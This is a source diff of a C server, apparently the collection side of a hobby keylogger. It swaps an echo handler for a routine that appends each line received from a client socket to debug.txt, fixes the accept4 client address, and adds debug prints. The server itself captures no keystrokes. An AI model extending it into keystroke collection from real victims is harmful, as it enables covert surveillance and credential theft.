@@ -40,8 +40,9 @@ void listen_for_connections(keylog_server* server) {
 
 int accept_client(keylog_server* server) {
   // LISTENING
+  struct sockaddr_in client;
   unsigned int address_size = sizeof(server->addr);
-  int client_fd = accept4(server->listener, (struct sockaddr*)&server,
+  int client_fd = accept4(server->listener, (struct sockaddr*)&client,
                           &address_size, SOCK_CLOEXEC);
   if (client_fd == -1) {
     error_and_exit("COULDN'T ACCEPT");
@@ -54,7 +55,11 @@ int accept_client(keylog_server* server) {
   }
 
   if (pid == 0) {
-    echo(client_fd);
+    // echo(client_fd);
+    puts("HERE WE GO");
+    process_keylog_info(client_fd);
+    puts("HERE WE GO 2");
+
     close(client_fd);
     return -1;
   } else {
@@ -63,19 +68,58 @@ int accept_client(keylog_server* server) {
   }
 }
 
-void echo(int socket_descriptor) {
-  char s[1000];
-  while (1) {
-    ssize_t got_message = recv(socket_descriptor, s, sizeof(s), 0);
-    if (got_message == -1) {
-      error_and_exit("Couldn't receive.");
+void process_keylog_info(int socket_descriptor) {
+  FILE* client_file = fdopen(socket_descriptor, "r+");
+  if (client_file == NULL) {
+    error_and_exit("Couldn't open file");
+  }
+  char* line = NULL;
+  size_t line_size = 0;
+  FILE* debug = fopen("debug.txt", "a+");
+  if (debug == NULL) {
+    error_and_exit("Couldn't open file");
+  }
+  // WHILE WE HAVEN'T CLOSED THE CLIENT
+  while (!feof(client_file)) {
+    puts("NOW HERE");
+    // GET THE LINE FROM THE CLIENT FILE
+    ssize_t debugger = getline(&line, &line_size, client_file);
+    puts("HERE WE GO 3");
+    if (debugger == -1) {
+      puts("BROKEN");
+      error_and_exit("XD");
     }
-    if (got_message == 0) {
-      break;
-    }
-    ssize_t sent_message = send(socket_descriptor, s, (size_t)got_message, 0);
-    if (sent_message == -1) {
-      error_and_exit("Couldn't send");
-    }
+    puts("smile :)");
+    // PRINT THE LINE TO A TEXT FILE
+
+    fprintf(debug, "%s", line);
+
+    // FREE THE LINE
+    free(line);
+    line = NULL;
+    puts("Test3");
+  }
+  // CLOSE THE TEXT FILE WE'RE WRITING TO
+  fclose(debug);
+  // CLOSE THE CLIENT
+  if (fclose(client_file) == EOF) {
+    error_and_exit("Couldn't close client socket descriptor");
   }
 }
+
+// void echo(int socket_descriptor) {
+//   char s[1000];
+//   while (1) {
+//     ssize_t got_message = recv(socket_descriptor, s, sizeof(s), 0);
+//     if (got_message == -1) {
+//       error_and_exit("Couldn't receive.");
+//     }
+//     if (got_message == 0) {
+//       break;
+//     }
+//     ssize_t sent_message = send(socket_descriptor, s, (size_t)got_message,
+//     0); if (sent_message == -1) {
+//       error_and_exit("Couldn't send");
+//     }
+//   }
+// }
